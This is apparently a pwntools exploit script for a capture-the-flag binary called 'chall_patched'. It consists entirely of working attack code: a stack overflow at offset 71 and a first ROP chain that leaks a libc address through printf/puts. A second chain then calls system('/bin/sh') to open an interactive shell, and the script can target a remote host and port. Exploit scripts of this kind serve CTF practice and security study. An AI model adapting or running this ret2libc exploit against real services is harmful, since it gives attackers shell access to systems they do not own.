#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chall_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+145
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 71
    ret = 0x40101a # ret;

    payload = flat({
        offset: [
            ret,
            exe.plt["printf"],
            exe.plt["puts"],
            exe.sym["main"]
        ]
    })

    payload = b"\x00" + payload

    io.sendlineafter(b"Data", payload)
    io.recvuntil(b":)\n")
    funlock = u64(io.recv(6).ljust(8, b"\x00"))
    libc.address = funlock - 0x62050
    info("libc base: %#x", libc.address)

    rop = ROP(libc)
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    payload = b"\x00" + payload
    io.sendline(payload)
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

